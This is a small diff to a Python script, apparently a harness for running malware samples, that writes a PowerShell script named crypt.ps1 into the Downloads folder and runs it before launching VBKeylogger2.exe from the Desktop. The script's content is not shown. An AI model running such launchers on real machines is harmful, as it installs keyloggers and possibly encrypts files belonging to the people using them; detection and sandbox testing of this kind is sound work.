@@ -21,10 +21,10 @@ def run_powershell_command(script_path: str):
     run_command(command)
 
 def main():
-    script_path = "crypt.ps1"
+    user_profile_path = getenv("UserProfile")
+    script_path = path.join(user_profile_path, "Downloads", "crypt.ps1")
     write_file(script_path, script_constants.crypt_script)
     run_powershell_command(script_path)
-    user_profile_path = getenv("UserProfile")
     sample_path = path.join(user_profile_path, "Desktop", "VBKeylogger2.exe")
     run_command(sample_path)
 
